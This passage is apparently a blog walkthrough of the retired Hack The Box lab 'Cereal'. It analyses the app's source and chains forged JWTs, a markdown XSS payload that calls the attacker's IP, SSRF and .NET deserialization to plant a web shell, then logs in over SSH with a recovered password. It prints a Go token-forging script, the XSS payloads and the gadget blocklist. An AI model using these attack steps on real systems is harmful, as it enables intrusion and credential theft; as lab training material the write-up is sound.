                    <span class="n">SigningCredentials</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SigningCredentials</span><span class="p">(</span><span class="k">new</span> <span class="n">SymmetricSecurityKey</span><span class="p">(</span><span class="n">key</span><span class="p">),</span> <span class="n">SecurityAlgorithms</span><span class="p">.</span><span class="n">HmacSha256Signature</span><span class="p">)</span>
                <span class="p">};</span>
                <span class="kt">var</span> <span class="n">token</span> <span class="p">=</span> <span class="n">tokenHandler</span><span class="p">.</span><span class="n">CreateToken</span><span class="p">(</span><span class="n">tokenDescriptor</span><span class="p">);</span>
                <span class="n">user</span><span class="p">.</span><span class="n">Token</span> <span class="p">=</span> <span class="n">tokenHandler</span><span class="p">.</span><span class="n">WriteToken</span><span class="p">(</span><span class="n">token</span><span class="p">);</span>

                <span class="k">return</span> <span class="n">user</span><span class="p">.</span><span class="n">WithoutPassword</span><span class="p">();</span>
            <span class="p">}</span>
</code></pre></div><p>When the user attempts to authenticate, the code snippet above checks to see if the user&rsquo;s credentials match those in the database. If the credentials match, the app will generate a JWT token for that user.</p>
<p>The user model is defined in here <code>Models/User.cs</code>. From here, I can assume each JWT token contains at least a user&rsquo;s ID, expiration time (7 days), username, and token.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
    <span class="k">public</span> <span class="k">class</span> <span class="nc">User</span>
    <span class="p">{</span>
<span class="na">        [Key]</span>
        <span class="k">public</span> <span class="kt">int</span> <span class="n">UserId</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>
<span class="na">        [Required]</span>
        <span class="k">public</span> <span class="kt">string</span> <span class="n">Username</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>
<span class="na">        [Required]</span>
        <span class="k">public</span> <span class="kt">string</span> <span class="n">Password</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>
        <span class="k">public</span> <span class="kt">string</span> <span class="n">Token</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>
    <span class="p">}</span>
<span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
</code></pre></div><p>Interestingly, in <code>ClientApp/src/LoginPage/LoginPage.jsx</code>, the authentication process doesn&rsquo;t look like it needs server/back-end validation, because it checks the browser&rsquo;s local storage first.</p>
<blockquote>
<p>It&rsquo;ll ask the server if we press the login button (POST request).</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="p">...</span><span class="o">&lt;</span><span class="nx">SNIP</span><span class="o">&gt;</span><span class="p">...</span>
<span class="kr">import</span> <span class="p">{</span> <span class="nx">authenticationService</span> <span class="p">}</span> <span class="nx">from</span> <span class="s1">&#39;../_services&#39;</span><span class="p">;</span> <span class="c1">// &lt;==
</span><span class="c1"></span>
<span class="kr">class</span> <span class="nx">LoginPage</span> <span class="kr">extends</span> <span class="nx">React</span><span class="p">.</span><span class="nx">Component</span> <span class="p">{</span>
    <span class="nx">constructor</span><span class="p">(</span><span class="nx">props</span><span class="p">)</span> <span class="p">{</span>
        <span class="kr">super</span><span class="p">(</span><span class="nx">props</span><span class="p">);</span>

        <span class="c1">// redirect to home if already logged in
</span><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nx">authenticationService</span><span class="p">.</span><span class="nx">currentUserValue</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">// &lt;==
</span><span class="c1"></span>            <span class="k">this</span><span class="p">.</span><span class="nx">props</span><span class="p">.</span><span class="nx">history</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">);</span> 
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="nx">render</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">return</span> <span class="p">(</span>
            <span class="o">&lt;</span><span class="nx">div</span><span class="o">&gt;</span>
                <span class="o">&lt;</span><span class="nx">h2</span><span class="o">&gt;</span><span class="nx">Login</span><span class="o">&lt;</span><span class="err">/h2&gt;</span>
<span class="p">...</span><span class="o">&lt;</span><span class="nx">SNIP</span><span class="o">&gt;</span><span class="p">...</span>
</code></pre></div><p>I could track the <code>authenticationService.currentUserValue</code> and it is defined in  <code>ClientApp/src/_services/authentication.service.jsx</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kr">const</span> <span class="nx">currentUserSubject</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BehaviorSubject</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="s1">&#39;currentUser&#39;</span><span class="p">)));</span> <span class="c1">// &lt;==
</span><span class="c1"></span>
<span class="kr">export</span> <span class="kr">const</span> <span class="nx">authenticationService</span> <span class="o">=</span> <span class="p">{</span>
    <span class="nx">login</span><span class="p">,</span>
    <span class="nx">logout</span><span class="p">,</span>
    <span class="nx">currentUser</span><span class="o">:</span> <span class="nx">currentUserSubject</span><span class="p">.</span><span class="nx">asObservable</span><span class="p">(),</span><span class="c1">// &lt;==
</span><span class="c1"></span>    <span class="nx">get</span> <span class="nx">currentUserValue</span> <span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="nx">currentUserSubject</span><span class="p">.</span><span class="nx">value</span> <span class="p">}</span> <span class="c1">// &lt;==
</span><span class="c1"></span><span class="p">};</span>
</code></pre></div><h3 id="authentication-bypass">Authentication Bypass</h3>
<p>I could summarize the previous code analysis to these points:</p>
<ul>
<li>As long as the browser&rsquo;s local storage contains a key of <code>currentUser</code> which has JWT token in its value, the client app will logs the user in.</li>
<li>No other validation in JWT token except the user&rsquo;s ID and expires date. (based on <code>Services/UserService.cs</code>)</li>
<li>Based on  <code>Models/User.cs</code>,  <code>Services/UserService.cs</code>, and  <code>ClientApp/src/_services/auth-header.js</code> , the form of <code>currentUser</code> is something like this:
<ul>
<li><code>&quot;currentUser&quot; : &quot;{ &quot;userId&quot;: &quot;0&quot;, &quot;username&quot;: &quot;name&quot;, &quot;token&quot;: &quot;JWT token&quot;}&quot;</code>.</li>
</ul>
</li>
</ul>
<p>And here are the tactics to bypass the login page:</p>
<ul>
<li>Since there is no validation on the issuer, and I have the JWT secret key, I could forge my own JWT.</li>
<li>I&rsquo;ll put the forged JWT token to browser&rsquo;s local storage of <code>cereal.htb</code> with the key name of <code>currentUser</code>.</li>
<li>Simply refresh the page afterwards and see if it logs me in.</li>
</ul>
<h4 id="forge-jwt">Forge JWT</h4>
<p>To forge our own JWT, you could try <a href="https://github.com/ticarpi/jwt_tool">jwtool</a>, but I tried to forge my own JWT using Golang. Here is the code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">main</span>

<span class="kn">import</span> <span class="p">(</span>
	<span class="s">&#34;encoding/json&#34;</span>
	<span class="s">&#34;fmt&#34;</span>
	<span class="s">&#34;time&#34;</span>

	<span class="s">&#34;github.com/dgrijalva/jwt-go&#34;</span>
<span class="p">)</span>

<span class="kd">type</span> <span class="nx">UserService</span> <span class="kd">interface</span> <span class="p">{</span>
	<span class="nf">CreateToken</span><span class="p">(</span><span class="nx">userID</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">string</span>
<span class="p">}</span>

<span class="kd">type</span> <span class="nx">jwtService</span> <span class="kd">struct</span> <span class="p">{</span>
	<span class="nx">secretKey</span> <span class="kt">string</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="p">(</span><span class="nx">s</span> <span class="o">*</span><span class="nx">jwtService</span><span class="p">)</span> <span class="nf">CreateToken</span><span class="p">()</span> <span class="kt">string</span> <span class="p">{</span>
	<span class="nx">claims</span> <span class="o">:=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">StandardClaims</span><span class="p">{</span>
		<span class="nx">ExpiresAt</span><span class="p">:</span> <span class="nx">time</span><span class="p">.</span><span class="nf">Now</span><span class="p">().</span><span class="nf">AddDate</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">7</span><span class="p">).</span><span class="nf">UTC</span><span class="p">().</span><span class="nf">Unix</span><span class="p">(),</span>
	<span class="p">}</span>

	<span class="nx">token</span> <span class="o">:=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nf">NewWithClaims</span><span class="p">(</span><span class="nx">jwt</span><span class="p">.</span><span class="nx">SigningMethodHS256</span><span class="p">,</span> <span class="nx">claims</span><span class="p">)</span>
	<span class="nx">t</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">token</span><span class="p">.</span><span class="nf">SignedString</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">s</span><span class="p">.</span><span class="nx">secretKey</span><span class="p">))</span>
	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="nx">t</span>
<span class="p">}</span>

<span class="kd">type</span> <span class="nx">User</span> <span class="kd">struct</span> <span class="p">{</span>
	<span class="nx">UserId</span>   <span class="kt">string</span> <span class="s">`json:&#34;userId,omitempty&#34;`</span>
	<span class="nx">Username</span> <span class="kt">string</span> <span class="s">`json:&#34;username,omitempty&#34;`</span>
	<span class="nx">Token</span>    <span class="kt">string</span> <span class="s">`json:&#34;token,omitempty&#34;`</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="nx">jwt</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">jwtService</span><span class="p">{}</span>
	<span class="nx">jwt</span><span class="p">.</span><span class="nx">secretKey</span> <span class="p">=</span> <span class="s">&#34;secretlhfIH&amp;FY*#oysuflkhskjfhefesf&#34;</span>

	<span class="nx">cu</span> <span class="o">:=</span> <span class="nx">User</span><span class="p">{</span>
		<span class="nx">UserId</span><span class="p">:</span>   <span class="s">&#34;1&#34;</span><span class="p">,</span>
		<span class="nx">Username</span><span class="p">:</span> <span class="s">&#34;iamf&#34;</span><span class="p">,</span>
		<span class="nx">Token</span><span class="p">:</span>    <span class="nx">jwt</span><span class="p">.</span><span class="nf">CreateToken</span><span class="p">(),</span>
	<span class="p">}</span>

	<span class="nx">currentUser</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">json</span><span class="p">.</span><span class="nf">Marshal</span><span class="p">(</span><span class="nx">cu</span><span class="p">)</span>
	<span class="nx">fmt</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="nx">currentUser</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></div><p>It produces the following output.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «cereal» «10.10.14.3»
$ go run main.go
<span class="o">{</span><span class="s2">&#34;userId&#34;</span>:<span class="s2">&#34;1&#34;</span>,<span class="s2">&#34;username&#34;</span>:<span class="s2">&#34;iamf&#34;</span>,<span class="s2">&#34;token&#34;</span>:<span class="s2">&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MjM4MTgwMzh9.XAcgRqhpgyJARsBMEWg1UOlUeRnQU4bvbk1SpAv3vDM&#34;</span><span class="o">}</span>
</code></pre></div><h4 id="login">Login</h4>
<p>At <code>https://cereal.htb</code>, I&rsquo;ll create a new local storage with a key name of  <code>currentUser</code> and I&rsquo;ll put the previous output as the key&rsquo;s value. When I refresh the site, it logs me in.</p>
<p><div class="img-container"><img src="imgs/image-20210609113605143.png" alt="image-20210609113605143"  /></div>
</p>
<h4 id="input-testing">Input testing</h4>
<p>When I submitted a URL which points to my attacking machine, I received a GET request coming from the Title field.</p>
<p><div class="img-container"><img src="imgs/image-20210605163056142.png" alt="image-20210605163056142"  /></div>
</p>
<p>Here how the request and the response looklike.</p>
<p><div class="img-container"><img src="imgs/image-20210605183457568.png" alt="image-20210605183457568"  /></div>
</p>
<h3 id="source--code-analysis-2">Source  Code Analysis #2</h3>
<blockquote>
<p>I decided to mix it with images hehe.</p>
</blockquote>
<h4 id="deserialization-vulnerability">Deserialization Vulnerability</h4>
<p>Looking into the request controller,  <code>Controllers/RequestsController.cs</code>, it turns out that each Cereal Request (POST) sent is saved in database without validation.</p>
<p><div class="img-container"><img src="imgs/image-20210609115652148.png" alt="image-20210609115652148"  /></div>
</p>
<p>Actually, there is a client-side validation, but it could easily be bypassed with Burp repeater. For example, I could send a cereal request in different structure:</p>
<p><div class="img-container"><img src="imgs/image-20210609122743196.png" alt="image-20210609122743196"  /></div>
</p>
<p>The cereal database&rsquo;s name can be found inside <code>CerealContext.cs</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210609120019771.png" alt="image-20210609120019771"  /></div>
</p>
<p>Looking back into the request controller, there is a comment inside the <code>Get</code> function that points out about deserialization (previously seen upon comparing the commit logs):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
<span class="na">        [Authorize(Policy = &#34;RestrictIP&#34;)]</span>
<span class="na">        [HttpGet(&#34;{id}&#34;)]</span>
        <span class="k">public</span> <span class="n">IActionResult</span> <span class="n">Get</span><span class="p">(</span><span class="kt">int</span> <span class="n">id</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">using</span> <span class="p">(</span><span class="kt">var</span> <span class="n">db</span> <span class="p">=</span> <span class="k">new</span> <span class="n">CerealContext</span><span class="p">())</span>
            <span class="p">{</span>
                <span class="kt">string</span> <span class="n">json</span> <span class="p">=</span> <span class="n">db</span><span class="p">.</span><span class="n">Requests</span><span class="p">.</span><span class="n">Where</span><span class="p">(</span><span class="n">x</span> <span class="p">=&gt;</span> <span class="n">x</span><span class="p">.</span><span class="n">RequestId</span> <span class="p">==</span> <span class="n">id</span><span class="p">).</span><span class="n">SingleOrDefault</span><span class="p">().</span><span class="n">JSON</span><span class="p">;</span>
                <span class="c1">// Filter to prevent deserialization attacks mentioned here: https://github.com/pwntester/ysoserial.net/tree/master/ysoserial
</span><span class="c1"></span>                <span class="k">if</span> <span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="n">ToLower</span><span class="p">().</span><span class="n">Contains</span><span class="p">(</span><span class="s">&#34;objectdataprovider&#34;</span><span class="p">)</span> <span class="p">||</span> <span class="n">json</span><span class="p">.</span><span class="n">ToLower</span><span class="p">().</span><span class="n">Contains</span><span class="p">(</span><span class="s">&#34;windowsidentity&#34;</span><span class="p">)</span> <span class="p">||</span> <span class="n">json</span><span class="p">.</span><span class="n">ToLower</span><span class="p">().</span><span class="n">Contains</span><span class="p">(</span><span class="s">&#34;system&#34;</span><span class="p">))</span>
                <span class="p">{</span>
                    <span class="k">return</span> <span class="n">BadRequest</span><span class="p">(</span><span class="k">new</span> <span class="p">{</span> <span class="n">message</span> <span class="p">=</span> <span class="s">&#34;The cereal police have been dispatched.&#34;</span> <span class="p">});</span>
                <span class="p">}</span>
                <span class="kt">var</span> <span class="n">cereal</span> <span class="p">=</span> <span class="n">JsonConvert</span><span class="p">.</span><span class="n">DeserializeObject</span><span class="p">(</span><span class="n">json</span><span class="p">,</span> <span class="k">new</span> <span class="n">JsonSerializerSettings</span>
                <span class="p">{</span>
                    <span class="n">TypeNameHandling</span> <span class="p">=</span> <span class="n">TypeNameHandling</span><span class="p">.</span><span class="n">Auto</span>
                <span class="p">});</span>
                <span class="k">return</span> <span class="n">Ok</span><span class="p">(</span><span class="n">cereal</span><span class="p">.</span><span class="n">ToString</span><span class="p">());</span>
            <span class="p">}</span>
        <span class="p">}</span>
</code></pre></div><p>The <code>Get</code> function can only be accessed if the request IP is in the whitelist (defined in <code>appsettings.json</code> ) and it takes one parameter called <code>id</code> (GET <code>/requests/{id}</code>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="na">[Authorize(Policy = &#34;RestrictIP&#34;)]</span>
<span class="na">[HttpGet(&#34;{id}&#34;)]</span>
</code></pre></div><p>This line blocks the gadget classes used for .NET deserialization attack.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="k">if</span> <span class="o">(</span>json.ToLower<span class="o">()</span>.Contains<span class="o">(</span><span class="s2">&#34;objectdataprovider&#34;</span><span class="o">)</span> <span class="o">||</span> json.ToLower<span class="o">()</span>.Contains<span class="o">(</span><span class="s2">&#34;windowsidentity&#34;</span><span class="o">)</span> <span class="o">||</span> json.ToLower<span class="o">()</span>.Contains<span class="o">(</span><span class="s2">&#34;system&#34;</span><span class="o">))</span>
</code></pre></div><p>But, there is a class called <code>DownloadHelper</code> that has a function which can be used to send a download request:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
    <span class="k">public</span> <span class="k">class</span> <span class="nc">DownloadHelper</span>
    <span class="p">{</span>
        <span class="k">private</span> <span class="n">String</span> <span class="m">_</span><span class="n">URL</span><span class="p">;</span>
        <span class="k">private</span> <span class="n">String</span> <span class="m">_F</span><span class="n">ilePath</span><span class="p">;</span>
        <span class="k">public</span> <span class="n">String</span> <span class="n">URL</span>
<span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
        <span class="k">private</span> <span class="k">void</span> <span class="n">Download</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="k">using</span> <span class="p">(</span><span class="n">WebClient</span> <span class="n">wc</span> <span class="p">=</span> <span class="k">new</span> <span class="n">WebClient</span><span class="p">())</span>
            <span class="p">{</span>
                <span class="k">if</span> <span class="p">(!</span><span class="kt">string</span><span class="p">.</span><span class="n">IsNullOrEmpty</span><span class="p">(</span><span class="m">_</span><span class="n">URL</span><span class="p">)</span> <span class="p">&amp;&amp;</span> <span class="p">!</span><span class="kt">string</span><span class="p">.</span><span class="n">IsNullOrEmpty</span><span class="p">(</span><span class="m">_F</span><span class="n">ilePath</span><span class="p">))</span>
                <span class="p">{</span>
                    <span class="n">wc</span><span class="p">.</span><span class="n">DownloadFile</span><span class="p">(</span><span class="m">_</span><span class="n">URL</span><span class="p">,</span> <span class="n">ReplaceLastOccurrence</span><span class="p">(</span><span class="m">_F</span><span class="n">ilePath</span><span class="p">,</span><span class="s">&#34;\\&#34;</span><span class="p">,</span> <span class="s">&#34;\\21098374243-&#34;</span><span class="p">));</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
</code></pre></div><p>I could use <code>DownloadHelper</code> class to download a web shell hosted on my machine by sending a serialized form of this class via the Cereal Request.</p>
<p>The problem here I couldn&rsquo;t make a GET request to <code>requests/{id}</code>  because there is an IP restriction policy.</p>
<h4 id="xss-vulnerability">XSS Vulnerability</h4>
<p>When tracking down where the previous GET request came from, I found out that each Cereal Request sent lands on the admin page (<code>AdminPage.jsx</code>).</p>
<p><div class="img-container"><img src="imgs/image-20210609114906150.png" alt="image-20210609114906150"  /></div>
</p>
<p>And one of the app library used in the admin page called <code>react-marked-down</code> has an <a href="https://hackerone.com/reports/344069">XSS vulnerability</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="p">...</span><span class="o">&lt;</span><span class="nx">SNIP</span><span class="o">&gt;</span><span class="p">...</span>
<span class="o">&lt;</span><span class="nx">Accordion</span><span class="p">.</span><span class="nx">Toggle</span> <span class="nx">as</span><span class="o">=</span><span class="p">{</span><span class="nx">Button</span><span class="p">}</span> <span class="nx">variant</span><span class="o">=</span><span class="s2">&#34;link&#34;</span> <span class="nx">eventKey</span><span class="o">=</span><span class="p">{</span><span class="k">this</span><span class="p">.</span><span class="nx">props</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">requestId</span><span class="p">}</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;expand&#34;</span> <span class="nx">id</span><span class="o">=</span><span class="p">{</span><span class="k">this</span><span class="p">.</span><span class="nx">props</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">requestId</span><span class="p">}</span><span class="o">&gt;</span>
    <span class="p">{</span><span class="nx">requestData</span> <span class="o">&amp;&amp;</span> <span class="nx">requestData</span><span class="p">.</span><span class="nx">title</span> <span class="o">&amp;&amp;</span> <span class="k">typeof</span> <span class="nx">requestData</span><span class="p">.</span><span class="nx">title</span> <span class="o">==</span> <span class="s1">&#39;string&#39;</span> <span class="o">&amp;&amp;</span> 
        <span class="o">&lt;</span><span class="nx">MarkdownPreview</span> <span class="nx">markedOptions</span><span class="o">=</span><span class="p">{{</span> <span class="nx">sanitize</span><span class="o">:</span> <span class="kc">true</span> <span class="p">}}</span> <span class="nx">value</span><span class="o">=</span><span class="p">{</span><span class="nx">requestData</span><span class="p">.</span><span class="nx">title</span><span class="p">}</span> <span class="o">/&gt;</span> <span class="c1">// &lt;==
</span><span class="c1"></span><span class="p">...</span><span class="o">&lt;</span><span class="nx">SNIP</span><span class="o">&gt;</span><span class="p">...</span>
</code></pre></div><p>I could confirm the vulnerability with the following payload:</p>
<pre tabindex="0"><code>[XSS](javascript: document.write`&lt;img src='http://10.10.14.3/iamf'/&gt;`)
</code></pre><p><div class="img-container"><img src="imgs/image-20210605212246743.png" alt="image-20210605212246743"  /></div>
</p>
<p>With a few experiments, URL encoding seems to work as well</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown">[<span class="nt">XSS</span>](<span class="na">javascript: document.write%28%22&lt;img src=&#39;http://10.10.14.3/iamf&#39;&gt;%22%29</span>)
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-sonny">Shell as Sonny</h3>
<h4 id="web-shell-upload-via-xss-and-deserialization">Web Shell Upload via XSS and Deserialization</h4>
<p>Putting it all together:</p>
<ul>
<li>There is an uploads directory at <code>https://source.cereal.htb/uploads/</code>.</li>
<li>The gadget classes for deserialization attack are filtered, but there is one class called <code>DownloadHelper</code> that can be accessed and it has a download function.</li>
<li>There is a SSRF (not sure yet) in the Title section, which can be used along with the XSS vulnerability to bypass the IP restriction.</li>
</ul>
<p>The tactics:</p>
<ul>
<li><a href="https://speakerdeck.com/pwntester/attacking-net-serialization?slide=25">Serialized</a> <code>DownloadHelper</code> class which contains a web shell URL that points to the attacking machine, and send it via the Cereal Request, note the ID.</li>
<li>Use XSS which bypasses the IP restriction, to make a GET request to <code>cereal.htb/request/{the ID}</code> to trigger the deserialization,</li>
<li>Confirms the web shell at <code>https://cereal.source.htb/uploads/shell-name.aspx</code></li>
</ul>
<p>I&rsquo;ve made a <a href="https://gist.github.com/fahmifj/c935b12c4b0a66ee30a7aa825d3c7fe1">script</a> to chain these vulnerabilities (XSS, SSRF, and Deserialization). The results is as follow:</p>
<p><div class="img-container"><img src="imgs/image-20210609125605658.png" alt="image-20210609125605658"  /></div>
</p>
<blockquote>
<p>That&rsquo;s on different IP because I decided to ran the exploit again to make sure it&rsquo;s still work XD</p>
</blockquote>
<p>I can access my web shell on <code>http://source.cereal.htb/uploads/iamf.aspx</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210609125710180.png" alt="image-20210609125710180"  /></div>
</p>
<h4 id="ssh---sonny">SSH - sonny</h4>
<p>A quick check on the web directory, I find the <code>cereal.db</code> at <code>c:\inetpub\cereal\db\cereal.db</code> and it contains a string that looks like a set of credentials.</p>
<p><div class="img-container"><img src="imgs/image-20210609133307066.png" alt="image-20210609133307066"  /></div>
</p>
<p>I tried it on SSH (<code>sonny:mutual.madden.manner38974</code>) and it worked.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">→ root@kali «exploits» «10.10.14.2» 
$ ssh sonny@cereal.htb
sonny@cereal.htb&#39;s password: 
Microsoft Windows [Version 10.0.17763.1817]
(c) 2018 Microsoft Corporation. All rights reserved.

sonny@CEREAL C:\Users\sonny&gt;dir desktop\ 
 Volume in drive C has no label.                   
 Volume Serial Number is C4EF-2153                 
                                                   
 Directory of C:\Users\sonny\desktop               
                                                   
11/16/2020  05:19 AM    &lt;DIR&gt;          .           
11/16/2020  05:19 AM    &lt;DIR&gt;          ..          
06/07/2021  09:59 PM                34 user.txt    
               1 File(s)             34 bytes      
               2 Dir(s)   7,621,619,712 bytes free 
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<p>It&rsquo;s retired already.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer">https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer</a></li>
<li><a href="https://docs.microsoft.com/en-us/dotnet/standard/serialization/system-text-json-how-to?pivots=dotnet-5-0">https://docs.microsoft.com/en-us/dotnet/standard/serialization/system-text-json-how-to?pivots=dotnet-5-0</a></li>
<li><a href="https://stackoverflow.com/questions/40898632/parentheses-alternatives-in-js-if-any">https://stackoverflow.com/questions/40898632/parentheses-alternatives-in-js-if-any</a></li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
